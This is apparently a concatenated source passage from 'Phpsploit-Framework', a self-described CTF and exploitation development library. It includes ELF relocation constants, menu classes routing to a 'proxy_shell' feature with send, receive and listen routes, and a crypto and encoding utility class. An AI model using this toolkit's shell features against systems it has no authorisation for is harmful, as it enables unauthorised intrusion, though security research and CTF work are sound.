#define SHT_RISCV_ATTRIBUTES	(SHT_LOPROC + 3)

/* RISC-V specific values for the p_type field.  */
#define PT_RISCV_ATTRIBUTES	(PT_LOPROC + 3)

/* RISC-V specific values for the d_tag field.  */
#define DT_RISCV_VARIANT_CC	(DT_LOPROC + 1)

/* BPF specific declarations.  */

#define R_BPF_NONE		0	/* No reloc */
#define R_BPF_64_64		1
#define R_BPF_64_32		10

/* Imagination Meta specific relocations. */

#define R_METAG_HIADDR16	0
#define R_METAG_LOADDR16	1
#define R_METAG_ADDR32		2	/* 32bit absolute address */
#define R_METAG_NONE		3	/* No reloc */
#define R_METAG_RELBRANCH	4
#define R_METAG_GETSETOFF	5

/* Backward compatibility */
#define R_METAG_REG32OP1	6
#define R_METAG_REG32OP2	7
#define R_METAG_REG32OP3	8
#define R_METAG_REG16OP1	9
#define R_METAG_REG16OP2	10
#define R_METAG_REG16OP3	11
#define R_METAG_REG32OP4	12

#define R_METAG_HIOG		13
#define R_METAG_LOOG		14

#define R_METAG_REL8		15
#define R_METAG_REL16		16

/* GNU */
#define R_METAG_GNU_VTINHERIT	30
#define R_METAG_GNU_VTENTRY	31

/* PIC relocations */
#define R_METAG_HI16_GOTOFF	32
#define R_METAG_LO16_GOTOFF	33
#define R_METAG_GETSET_GOTOFF	34
#define R_METAG_GETSET_GOT	35
#define R_METAG_HI16_GOTPC	36
#define R_METAG_LO16_GOTPC	37
#define R_METAG_HI16_PLT	38
#define R_METAG_LO16_PLT	39
#define R_METAG_RELBRANCH_PLT	40
#define R_METAG_GOTOFF		41
#define R_METAG_PLT		42
#define R_METAG_COPY		43
#define R_METAG_JMP_SLOT	44
#define R_METAG_RELATIVE	45
#define R_METAG_GLOB_DAT	46

/* TLS relocations */
#define R_METAG_TLS_GD		47
#define R_METAG_TLS_LDM		48
#define R_METAG_TLS_LDO_HI16	49
#define R_METAG_TLS_LDO_LO16	50
#define R_METAG_TLS_LDO		51
#define R_METAG_TLS_IE		52
#define R_METAG_TLS_IENONPIC	53
#define R_METAG_TLS_IENONPIC_HI16 54
#define R_METAG_TLS_IENONPIC_LO16 55
#define R_METAG_TLS_TPOFF	56
#define R_METAG_TLS_DTPMOD	57
#define R_METAG_TLS_DTPOFF	58
#define R_METAG_TLS_LE		59
#define R_METAG_TLS_LE_HI16	60
#define R_METAG_TLS_LE_LO16	61

/* NDS32 relocations.  */
#define R_NDS32_NONE		0
#define R_NDS32_32_RELA 	20
#define R_NDS32_COPY		39
#define R_NDS32_GLOB_DAT	40
#define R_NDS32_JMP_SLOT	41
#define R_NDS32_RELATIVE	42
#define R_NDS32_TLS_TPOFF	102
#define R_NDS32_TLS_DESC	119

/* LoongArch ELF Flags */
#define EF_LARCH_ABI_MODIFIER_MASK  0x07
#define EF_LARCH_ABI_SOFT_FLOAT     0x01
#define EF_LARCH_ABI_SINGLE_FLOAT   0x02
#define EF_LARCH_ABI_DOUBLE_FLOAT   0x03
#define EF_LARCH_OBJABI_V1          0x40

/* LoongArch specific dynamic relocations */
#define R_LARCH_NONE		0
#define R_LARCH_32		1
#define R_LARCH_64		2
#define R_LARCH_RELATIVE	3
#define R_LARCH_COPY		4
#define R_LARCH_JUMP_SLOT	5
#define R_LARCH_TLS_DTPMOD32	6
#define R_LARCH_TLS_DTPMOD64	7
#define R_LARCH_TLS_DTPREL32	8
#define R_LARCH_TLS_DTPREL64	9
#define R_LARCH_TLS_TPREL32	10
#define R_LARCH_TLS_TPREL64	11
#define R_LARCH_IRELATIVE	12

/* Reserved for future relocs that the dynamic linker must understand.  */

/* used by the static linker for relocating .text.  */
#define R_LARCH_MARK_LA  20
#define R_LARCH_MARK_PCREL  21
#define R_LARCH_SOP_PUSH_PCREL  22
#define R_LARCH_SOP_PUSH_ABSOLUTE  23
#define R_LARCH_SOP_PUSH_DUP  24
#define R_LARCH_SOP_PUSH_GPREL  25
#define R_LARCH_SOP_PUSH_TLS_TPREL  26
#define R_LARCH_SOP_PUSH_TLS_GOT  27
#define R_LARCH_SOP_PUSH_TLS_GD  28
#define R_LARCH_SOP_PUSH_PLT_PCREL  29
#define R_LARCH_SOP_ASSERT  30
#define R_LARCH_SOP_NOT  31
#define R_LARCH_SOP_SUB  32
#define R_LARCH_SOP_SL  33
#define R_LARCH_SOP_SR  34
#define R_LARCH_SOP_ADD  35
#define R_LARCH_SOP_AND  36
#define R_LARCH_SOP_IF_ELSE  37
#define R_LARCH_SOP_POP_32_S_10_5  38
#define R_LARCH_SOP_POP_32_U_10_12  39
#define R_LARCH_SOP_POP_32_S_10_12  40
#define R_LARCH_SOP_POP_32_S_10_16  41
#define R_LARCH_SOP_POP_32_S_10_16_S2  42
#define R_LARCH_SOP_POP_32_S_5_20  43
#define R_LARCH_SOP_POP_32_S_0_5_10_16_S2  44
#define R_LARCH_SOP_POP_32_S_0_10_10_16_S2  45
#define R_LARCH_SOP_POP_32_U  46

/* used by the static linker for relocating non .text.  */
#define R_LARCH_ADD8  47
#define R_LARCH_ADD16  48
#define R_LARCH_ADD24  49
#define R_LARCH_ADD32  50
#define R_LARCH_ADD64  51
#define R_LARCH_SUB8  52
#define R_LARCH_SUB16  53
#define R_LARCH_SUB24  54
#define R_LARCH_SUB32  55
#define R_LARCH_SUB64  56
#define R_LARCH_GNU_VTINHERIT  57
#define R_LARCH_GNU_VTENTRY  58


/* ARCompact/ARCv2 specific relocs.  */
#define R_ARC_NONE		0x0
#define R_ARC_8			0x1
#define R_ARC_16		0x2
#define R_ARC_24		0x3
#define R_ARC_32		0x4
#define R_ARC_B26		0x5
#define R_ARC_B22_PCREL		0x6
#define R_ARC_H30		0x7
#define R_ARC_N8		0x8
#define R_ARC_N16		0x9
#define R_ARC_N24		0xA
#define R_ARC_N32		0xB
#define R_ARC_SDA		0xC
#define R_ARC_SECTOFF		0xD
#define R_ARC_S21H_PCREL	0xE
#define R_ARC_S21W_PCREL	0xF
#define R_ARC_S25H_PCREL	0x10
#define R_ARC_S25W_PCREL	0x11
#define R_ARC_SDA32		0x12
#define R_ARC_SDA_LDST		0x13
#define R_ARC_SDA_LDST1		0x14
#define R_ARC_SDA_LDST2		0x15
#define R_ARC_SDA16_LD		0x16
#define R_ARC_SDA16_LD1		0x17
#define R_ARC_SDA16_LD2		0x18
#define R_ARC_S13_PCREL		0x19
#define R_ARC_W			0x1A
#define R_ARC_32_ME		0x1B
#define R_ARC_N32_ME		0x1C
#define R_ARC_SECTOFF_ME	0x1D
#define R_ARC_SDA32_ME		0x1E
#define R_ARC_W_ME		0x1F
#define R_ARC_H30_ME		0x20
#define R_ARC_SECTOFF_U8	0x21
#define R_ARC_SECTOFF_S9	0x22
#define R_AC_SECTOFF_U8		0x23
#define R_AC_SECTOFF_U8_1	0x24
#define R_AC_SECTOFF_U8_2	0x25
#define R_AC_SECTOFF_S9		0x26
#define R_AC_SECTOFF_S9_1	0x27
#define R_AC_SECTOFF_S9_2	0x28
#define R_ARC_SECTOFF_ME_1	0x29
#define R_ARC_SECTOFF_ME_2	0x2A
#define R_ARC_SECTOFF_1		0x2B
#define R_ARC_SECTOFF_2		0x2C
#define R_ARC_PC32		0x32
#define R_ARC_GOTPC32		0x33
#define R_ARC_PLT32		0x34
#define R_ARC_COPY		0x35
#define R_ARC_GLOB_DAT		0x36
#define R_ARC_JUMP_SLOT		0x37
#define R_ARC_RELATIVE		0x38
#define R_ARC_GOTOFF		0x39
#define R_ARC_GOTPC		0x3A
#define R_ARC_GOT32		0x3B

#define R_ARC_TLS_DTPMOD	0x42
#define R_ARC_TLS_DTPOFF	0x43
#define R_ARC_TLS_TPOFF		0x44
#define R_ARC_TLS_GD_GOT	0x45
#define R_ARC_TLS_GD_LD	        0x46
#define R_ARC_TLS_GD_CALL	0x47
#define R_ARC_TLS_IE_GOT	0x48
#define R_ARC_TLS_DTPOFF_S9	0x4a
#define R_ARC_TLS_LE_S9		0x4a
#define R_ARC_TLS_LE_32		0x4b

/* OpenRISC 1000 specific relocs.  */
#define R_OR1K_NONE		0
#define R_OR1K_32		1
#define R_OR1K_16		2
#define R_OR1K_8		3
#define R_OR1K_LO_16_IN_INSN	4
#define R_OR1K_HI_16_IN_INSN	5
#define R_OR1K_INSN_REL_26	6
#define R_OR1K_GNU_VTENTRY	7
#define R_OR1K_GNU_VTINHERIT	8
#define R_OR1K_32_PCREL		9
#define R_OR1K_16_PCREL		10
#define R_OR1K_8_PCREL		11
#define R_OR1K_GOTPC_HI16	12
#define R_OR1K_GOTPC_LO16	13
#define R_OR1K_GOT16		14
#define R_OR1K_PLT26		15
#define R_OR1K_GOTOFF_HI16	16
#define R_OR1K_GOTOFF_LO16	17
#define R_OR1K_COPY		18
#define R_OR1K_GLOB_DAT		19
#define R_OR1K_JMP_SLOT		20
#define R_OR1K_RELATIVE		21
#define R_OR1K_TLS_GD_HI16	22
#define R_OR1K_TLS_GD_LO16	23
#define R_OR1K_TLS_LDM_HI16	24
#define R_OR1K_TLS_LDM_LO16	25
#define R_OR1K_TLS_LDO_HI16	26
#define R_OR1K_TLS_LDO_LO16	27
#define R_OR1K_TLS_IE_HI16	28
#define R_OR1K_TLS_IE_LO16	29
#define R_OR1K_TLS_LE_HI16	30
#define R_OR1K_TLS_LE_LO16	31
#define R_OR1K_TLS_TPOFF	32
#define R_OR1K_TLS_DTPOFF	33
#define R_OR1K_TLS_DTPMOD	34

#endif	/* elf.h */
';
        return $_string;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_ProxyShell_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "create_session_id" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/proxy_shell/create_session_id" , array () ) ,
                ) ,
                array (
                    "title"    => "clear_session_id" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/proxy_shell/clear_session_id" , array () ) ,
                ) ,
                array (
                    "title"    => "send" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/proxy_shell/send" , array () ) ,
                ) ,
                array (
                    "title"    => "receive" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/proxy_shell/receive" , array () ) ,
                ) ,
                array (
                    "title"    => "listen" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/proxy_shell/listen" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Cookie_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "cookie_info" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/cookie/cookie_info" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-29
 * Time: 上午11:48
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Security extends Class_Base implements Interface_Base_Security
{
    const TYPE_URL_ENCODE            = 10000001;
    const TYPE_URL_DECODE            = 10000002;
    const TYPE_BASE64_ENCODE         = 10000003;
    const TYPE_BASE64_DECODE         = 10000004;
    const TYPE_OPENSSL_ENCODE        = 10000005;
    const TYPE_OPENSSL_DECODE        = 10000006;
    const TYPE_SODIUM_BASE64_TO_BIN2 = 10000007;
    const TYPE_SODIUM_BIN2_TO_BASE64 = 10000008;
    const TYPE_ENCODE_CRYPTO_JS      = 10000001;

    private static $_url_types              = array ( self::TYPE_URL_ENCODE , self::TYPE_URL_DECODE );
    private static $_base64_types           = array ( self::TYPE_BASE64_ENCODE , self::TYPE_BASE64_DECODE );
    private static $_openssl_types          = array ( self::TYPE_OPENSSL_ENCODE , self::TYPE_OPENSSL_DECODE );
    private static $_sodium_types           = array ( self::TYPE_SODIUM_BASE64_TO_BIN2 , self::TYPE_SODIUM_BIN2_TO_BASE64 );
    private static $_hash_hmac_algos        = null;
    private static $_openssl_cipher_algos   = null;
    private static $_openssl_options        = array ( 0 , OPENSSL_RAW_DATA , OPENSSL_ZERO_PADDING , OPENSSL_RAW_DATA_OR_OPENSSL_ZERO_PADDING );
    private static $_openssl_tag_lengths    = null;
    private static $_hash_algos             = null;
    private static $_password_hash_algos    = array ();
    private static $_sodium_ids             = array ();
    private static $_phpsploit_encode_types = array ( self::TYPE_ENCODE_CRYPTO_JS , );

    public static function get_url_types ()
    {
        return self ::$_url_types;
    }

    public static function is_url_type ( $url_type )
    {
        $_exist = in_array ( $url_type , self ::$_url_types );
        return $_exist;
    }

    public static function get_base64_types ()
    {
        return self ::$_base64_types;
    }

    public static function is_base64_type ( $base64_type )
    {
        $_exist = in_array ( $base64_type , self ::$_base64_types );
        return $_exist;
    }

    public static function get_openssl_types ()
    {
        return self ::$_openssl_types;
    }

    public static function is_openssl_type ( $openssl_type )
    {
        $_exist = in_array ( $openssl_type , self ::$_openssl_types );
        return $_exist;
    }

    public static function get_hash_hmac_algos ()
    {
        if ( empty( self ::$_hash_hmac_algos ) ) {
            self ::$_hash_hmac_algos = hash_hmac_algos ();
        }
        return self ::$_hash_hmac_algos;
    }

    public static function is_hash_hmac_algo ( $hash_hmac_algo )
    {
        $_exist = in_array ( $hash_hmac_algo , self ::get_hash_hmac_algos () );
        return $_exist;
    }

    public static function get_hash_hmac ( $algo , $data , $key )
    {
        if ( ( ! is_string ( $algo ) ) || ( strlen ( $algo ) <= 0 ) ) {
            throw new \Exception( "algo is error" , 0 );
        }
        if ( ( ! is_string ( $data ) ) || ( strlen ( $data ) <= 0 ) ) {
            throw new \Exception( "data is error" , 0 );
        }
        if ( ( ! is_string ( $key ) ) || ( strlen ( $key ) <= 0 ) ) {
            throw new \Exception( "key is error" , 0 );
        }
        $_algos = self ::get_hash_hmac_algos ();
        if ( ! in_array ( $algo , $_algos ) ) {
            throw new \Exception( "algo is error" , 0 );
        }
        $_data = hash_hmac ( $algo , $data , $key );
        return $_data;
    }

    public static function get_openssl_cipher_algos ()
    {
        if ( empty( self ::$_openssl_cipher_algos ) ) {
            self ::$_openssl_cipher_algos = openssl_get_cipher_methods ();
        }
        return self ::$_openssl_cipher_algos;
    }

    public static function is_openssl_cipher_algo ( $cipher_algo )
    {
        $_exist = in_array ( $cipher_algo , self ::get_openssl_cipher_algos () );
        return $_exist;
    }

    public static function get_openssl_options ()
    {
        return self ::$_openssl_options;
    }

    public static function is_openssl_options ( $options )
    {
        $_exist = in_array ( $options , self ::$_openssl_options );
        return $_exist;
    }

    public static function get_openssl_tag_lengths ()
    {
        if ( empty( self ::$_openssl_tag_lengths ) ) {
            for ( $index = 0 ; $index <= 16 ; $index ++ ) {
                self ::$_openssl_tag_lengths[] = $index;
            }
        }
        return self ::$_openssl_tag_lengths;
    }

    public static function is_gcm_or_ccm_cipher_algo ( $cipher_algo )
    {
        if ( self ::is_openssl_cipher_algo ( $cipher_algo ) ) {
            $_cipher_algo_item = explode ( "-" , $cipher_algo );
            $_tag_mode         = strtolower ( $_cipher_algo_item[ count ( $_cipher_algo_item ) - 1 ] );
            if ( ( $_tag_mode == "gcm" ) || ( $_tag_mode == "ccm" ) ) {
                return true;
            }
        }
        return false;
    }

    public static function is_gcm_cipher_algo ( $cipher_algo )
    {
        if ( self ::is_openssl_cipher_algo ( $cipher_algo ) ) {
            $_cipher_algo_item = explode ( "-" , $cipher_algo );
            $_tag_mode         = strtolower ( $_cipher_algo_item[ count ( $_cipher_algo_item ) - 1 ] );
            if ( ( $_tag_mode == "gcm" ) ) {
                return true;
            }
        }
        return false;
    }

    public static function is_ccm_cipher_algo ( $cipher_algo )
    {
        if ( self ::is_openssl_cipher_algo ( $cipher_algo ) ) {
            $_cipher_algo_item = explode ( "-" , $cipher_algo );
            $_tag_mode         = strtolower ( $_cipher_algo_item[ count ( $_cipher_algo_item ) - 1 ] );
            if ( ( $_tag_mode == "ccm" ) ) {
                return true;
            }
        }
        return false;
    }

    public static function is_openssl_tag ( $tag , $cipher_algo )
    {
        if ( self ::is_openssl_cipher_algo ( $cipher_algo ) ) {
            $_cipher_algo_item = explode ( "-" , $cipher_algo );
            $_tag_mode         = strtolower ( $_cipher_algo_item[ count ( $_cipher_algo_item ) - 1 ] );
            if ( ( $_tag_mode != "gcm" ) && ( $_tag_mode != "ccm" ) && ( ! is_null ( $tag ) ) ) {
                return false;
            }
            return true;
        }
        return false;
    }

    public static function get_openssl_tag ( $tag , $cipher_algo )
    {
        if ( self ::is_openssl_cipher_algo ( $cipher_algo ) ) {
            $_cipher_algo_item = explode ( "-" , $cipher_algo );
            $_tag_mode         = strtolower ( $_cipher_algo_item[ count ( $_cipher_algo_item ) - 1 ] );
            if ( ( $_tag_mode != "gcm" ) && ( $_tag_mode != "ccm" ) && ( ! is_null ( $tag ) ) ) {
                return null;
            }
            return $tag;
        }
        return false;
    }

    public static function is_openssl_tag_length ( $tag_length , $cipher_algo )
    {
        $_exist = in_array ( $tag_length , self ::get_openssl_tag_lengths () );
        if ( ! empty( $_exist ) ) {
            if ( self ::is_openssl_cipher_algo ( $cipher_algo ) ) {
                $_cipher_algo_item = explode ( "-" , $cipher_algo );
                $_tag_mode         = strtolower ( $_cipher_algo_item[ count ( $_cipher_algo_item ) - 1 ] );
                if ( $_tag_mode == "gcm" ) {
                    if ( ( $tag_length >= 4 ) && ( $tag_length <= 16 ) ) {
                        return true;
                    }
                } else if ( $_tag_mode == "ccm" ) {
                    if ( $tag_length > 0 ) {
                        return true;
                    }
                } else {
                    return true;
                }
            }
        }
        return false;
    }

    public static function get_openssl_iv ( $cipher_algo )
    {
        if ( ( ! empty( $cipher_algo ) ) && self ::is_openssl_cipher_algo ( $cipher_algo ) ) {
            $_ivlen = openssl_cipher_iv_length ( $cipher_algo );
            $_iv    = openssl_random_pseudo_bytes ( $_ivlen );
            return $_iv;
        }
        return false;
    }

    public static function get_openssl_encode ( $data , $cipher_algo , $passphrase , $options = 0 , $iv = "" , &$tag = null , $aad = "" , $tag_length = 16 )
    {
        if ( ( ! is_string ( $data ) ) || ( strlen ( $data ) <= 0 ) ) {
            throw new \Exception( "The plaintext information data to be encrypted is invalid ! data : " . print_r ( $data , true ) , 0 );
        }
        if ( ( ! is_string ( $cipher_algo ) ) || ( strlen ( $cipher_algo ) <= 0 ) || ( ! self ::is_openssl_cipher_algo ( $cipher_algo ) ) ) {
            throw new \Exception( "Invalid cryptographic method ! cipher algo : " . print_r ( $cipher_algo , true ) , 0 );
        }
        if ( ( ! is_string ( $passphrase ) ) || ( strlen ( $passphrase ) <= 0 ) ) {
            throw new \Exception( "Invalid encrypted password ! passphrase : " . print_r ( $passphrase , true ) , 0 );
        }
        if ( ( ! is_integer ( $options ) ) || ( ! self ::is_openssl_options ( $options ) ) ) {
            throw new \Exception( "Invalid encryption option ! options : " . print_r ( $options , true ) , 0 );
        }
        if ( ( ! is_string ( $iv ) ) || ( strlen ( $iv ) <= 0 ) ) {
            throw new \Exception( "Invalid encryption initialization vector ! iv : " . print_r ( $iv , true ) , 0 );
        }
        if ( ( ! is_null ( $tag ) ) && ( ! is_string ( $tag ) ) ) {
            throw new \Exception( "The validation label referenced when using AEAD password mode (GCM or CCM) is invalid ! tag : " . print_r ( $tag , true ) , 0 );
        }
        if ( ( ! is_string ( $aad ) ) ) {
            throw new \Exception( "The attached validation data is invalid ! aad : " . print_r ( $aad , true ) , 0 );
        }
        if ( ( ! is_integer ( $tag_length ) ) || ( ! self ::is_openssl_tag_length ( $tag_length , $cipher_algo ) ) ) {
            throw new \Exception( "The validation length of tag is invalid ! tag length : " . print_r ( $tag_length , true ) , 0 );
        }
        $_data = openssl_encrypt ( $data , $cipher_algo , $passphrase , $options , $iv , $tag , $aad , $tag_length );
        return $_data;
    }

    public static function get_openssl_decode ( $data , $cipher_algo , $passphrase , $options = 0 , $iv = "" , $tag = null , $aad = "" )
    {
        if ( ( ! is_string ( $data ) ) || ( strlen ( $data ) <= 0 ) ) {
            throw new \Exception( "The ciphertext information data to be decrypted is invalid ! data : " . print_r ( $data , true ) , 0 );
        }
        $_cipher_algos = self ::get_openssl_cipher_algos ();
        if ( ( ! is_string ( $cipher_algo ) ) || ( strlen ( $cipher_algo ) <= 0 ) || ( ! self ::is_openssl_cipher_algo ( $cipher_algo ) ) ) {
            throw new \Exception( "Invalid decryption method ! cipher algo : " . print_r ( $cipher_algo , true ) , 0 );
        }
        if ( ( ! is_string ( $passphrase ) ) || ( strlen ( $passphrase ) <= 0 ) ) {
            throw new \Exception( "Invalid decryption password ! passphrase : " . print_r ( $passphrase , true ) , 0 );
        }
        if ( ( ! is_integer ( $options ) ) || ( ! self ::is_openssl_options ( $options ) ) ) {
            throw new \Exception( "Invalid decryption option ! options : " . print_r ( $options , true ) , 0 );
        }
        if ( ( ! is_string ( $iv ) ) || ( strlen ( $iv ) <= 0 ) ) {
            throw new \Exception( "Invalid decryption initialization vector ! iv : " . print_r ( $iv , true ) , 0 );
        }
        if ( self ::is_gcm_or_ccm_cipher_algo ( $cipher_algo ) ) {
            if ( ( ! is_string ( $tag ) ) ) {
                throw new \Exception( "The validation label referenced when using AEAD password mode (GCM or CCM) is invalid ! tag : " . print_r ( $tag , true ) , 0 );
            }
            $_tag_length = strlen ( $tag );
            if ( ( $_tag_length <= 0 ) || ( $_tag_length > 1024 ) ) {
                throw new \Exception( "The validation label referenced when using AEAD password mode (GCM or CCM) is invalid ! tag length : " . print_r ( $_tag_length , true ) , 0 );
            }
        } else {
            if ( ( ! is_null ( $tag ) ) ) {
                throw new \Exception( "The validation label referenced when using AEAD password mode (GCM or CCM) is invalid ! tag : " . print_r ( $tag , true ) , 0 );
            }
        }
        if ( ( ! is_string ( $aad ) ) ) {
            throw new \Exception( "The attached validation data is invalid ! aad : " . print_r ( $aad , true ) , 0 );
        }
        $_data = openssl_decrypt ( $data , $cipher_algo , $passphrase , $options , $iv , $tag , $aad );
        return $_data;
    }

    public static function get_hash_algos ()
    {
        if ( empty( self ::$_hash_algos ) ) {
            self ::$_hash_algos = hash_algos ();
        }
        return self ::$_hash_algos;
    }

    public static function is_hash_algo ( $hash_algo )
    {
        $_exist = in_array ( $hash_algo , self ::get_hash_algos () );
        return $_exist;
    }

    public static function get_hash ( $hash_algo , $data , $raw_output = false , $options = array () )
    {
        if ( ( ! is_string ( $hash_algo ) ) || ( strlen ( $hash_algo ) <= 0 ) ) {
            throw new \Exception( "hash_algo is not a string, or the length of hash_algo is less than or equal to 0" , 0 );
        }
        if ( ( ! is_string ( $data ) ) ) {
            throw new \Exception( "data is not a string" , 0 );
        }
        if ( ( ! is_bool ( $raw_output ) ) ) {
            throw new \Exception( "raw_output is not a boolean" , 0 );
        }
        if ( ( ! is_array ( $options ) ) ) {
            throw new \Exception( "options is not a array" , 0 );
        }
        if ( ! self ::is_hash_algo ( $hash_algo ) ) {
            throw new \Exception( "hash_algo is error" , 0 );
        }
        if ( PHP_VERSION_ID > 80100 ) {
            $_data = hash ( $hash_algo , $data , $raw_output , $options );
        } else {
            $_data = hash ( $hash_algo , $data , $raw_output );
        }
        return $_data;
    }

    public static function get_password_hash_algos ()
    {
        if ( defined ( "PASSWORD_DEFAULT" ) && ( ! in_array ( PASSWORD_DEFAULT , self ::$_password_hash_algos ) ) ) {
            self ::$_password_hash_algos[] = PASSWORD_DEFAULT;
        }
        if ( defined ( "PASSWORD_BCRYPT" ) && ( ! in_array ( PASSWORD_BCRYPT , self ::$_password_hash_algos ) ) ) {
            self ::$_password_hash_algos[] = PASSWORD_BCRYPT;
        }
        if ( defined ( "PASSWORD_ARGON2I" ) && ( ! in_array ( PASSWORD_ARGON2I , self ::$_password_hash_algos ) ) ) {
            self ::$_password_hash_algos[] = PASSWORD_ARGON2I;
        }
        if ( defined ( "PASSWORD_ARGON2ID" ) && ( ! in_array ( PASSWORD_ARGON2ID , self ::$_password_hash_algos ) ) ) {
            self ::$_password_hash_algos[] = PASSWORD_ARGON2ID;
        }
        return self ::$_password_hash_algos;
    }

    public static function is_password_hash_algo ( $algo )
    {
        $_exist = in_array ( $algo , self ::get_password_hash_algos () );
        return $_exist;
    }

    public static function get_password_hash ( $password , $algo , $options = array () )
    {
        if ( ( ! is_string ( $password ) ) || ( strlen ( $password ) <= 0 ) ) {
            throw new \Exception( "password is error" , 0 );
        }
        if ( ( ! is_string ( $algo ) ) || ( strlen ( $algo ) <= 0 ) || ( ! self ::is_password_hash_algo ( $algo ) ) ) {
            throw new \Exception( "algo is error" , 0 );
        }
        if ( ( ! is_array ( $options ) ) ) {
            throw new \Exception( "options is error" , 0 );
        }
        $_password_hash = password_hash ( $password , $algo , $options );
        return $_password_hash;
    }

    public static function get_sodium_ids ()
    {
        if ( defined ( "SODIUM_BASE64_VARIANT_ORIGINAL" ) && defined ( "SODIUM_BASE64_VARIANT_ORIGINAL_NO_PADDING" ) && defined ( "SODIUM_BASE64_VARIANT_URLSAFE" ) && defined ( "SODIUM_BASE64_VARIANT_URLSAFE_NO_PADDING" ) ) {
            self ::$_sodium_ids = array ( SODIUM_BASE64_VARIANT_ORIGINAL , SODIUM_BASE64_VARIANT_ORIGINAL_NO_PADDING , SODIUM_BASE64_VARIANT_URLSAFE , SODIUM_BASE64_VARIANT_URLSAFE_NO_PADDING );
        }
        return self ::$_sodium_ids;
    }

    public static function is_sodium_id ( $id )
    {
        $_exist = in_array ( $id , self ::get_sodium_ids () );
        return $_exist;
    }

    public static function get_sodium_types ()
    {
        return self ::$_sodium_types;
    }

    public static function is_sodium_type ( $type )
    {
        $_exist = in_array ( $type , self ::get_sodium_types () );
        return $_exist;
    }

    public static function sodium_base64_to_bin2_format_string ( $string , $id , $ignore = "" )
    {
        if ( ( ! is_string ( $string ) ) || ( strlen ( $string ) <= 0 ) ) {
            throw new \Exception( "string is error" , 0 );
        }
        if ( ( ! is_integer ( $id ) ) || ( ! self ::is_sodium_id ( $id ) ) ) {
            throw new \Exception( "id is error" , 0 );
        }
        if ( ( ! is_string ( $ignore ) ) ) {
            throw new \Exception( "ignore is error" , 0 );
        }
        $_data = sodium_base642bin ( $string , $id , $ignore );
        if ( ( ! is_string ( $_data ) ) || ( strlen ( $_data ) <= 0 ) ) {
            throw new \Exception( "data is error" , 0 );
        }
        $_data = Class_Base_Security ::bin2_string_to_format_bin2_string ( $_data );
        return $_data;
    }

    public static function sodium_bin2_format_string_to_base64 ( $string , $id )
    {
        if ( ( ! is_string ( $string ) ) || ( strlen ( $string ) <= 0 ) ) {
            throw new \Exception( "string is error" , 0 );
        }
        if ( ( ! is_integer ( $id ) ) || ( ! self ::is_sodium_id ( $id ) ) ) {
            throw new \Exception( "id is error" , 0 );
        }
        $_data = Class_Base_Security ::format_bin2_string_to_bin2_string ( $string );
        if ( ( ! is_string ( $_data ) ) || ( strlen ( $_data ) <= 0 ) ) {
            throw new \Exception( "data is error" , 0 );
        }
        $_data = sodium_bin2base64 ( $_data , $id );
        return $_data;
    }

    public static function bin2_string_to_format_bin2_string ( $bin2_content )
    {
        if ( is_string ( $bin2_content ) ) {
            $_bin2_content_length = strlen ( $bin2_content );
            $_return_content      = "";
            for ( $index = 0 ; $index < $_bin2_content_length ; $index ++ ) {
                $_return_content .= ( '\x' . ( str_pad ( dechex ( ord ( substr ( $bin2_content , $index , 1 ) ) ) , 2 , '0' , STR_PAD_LEFT ) ) );
            }
            return $_return_content;
        }
        return false;
    }

    public static function get_bin2_string_size ( $bin2_content )
    {
        if ( is_string ( $bin2_content ) ) {
            $_bin2_content_length = strlen ( $bin2_content );
            return $_bin2_content_length;
        }
        return false;
    }

    public static function format_bin2_string_to_bin2_string ( $format_bin2_content )
    {
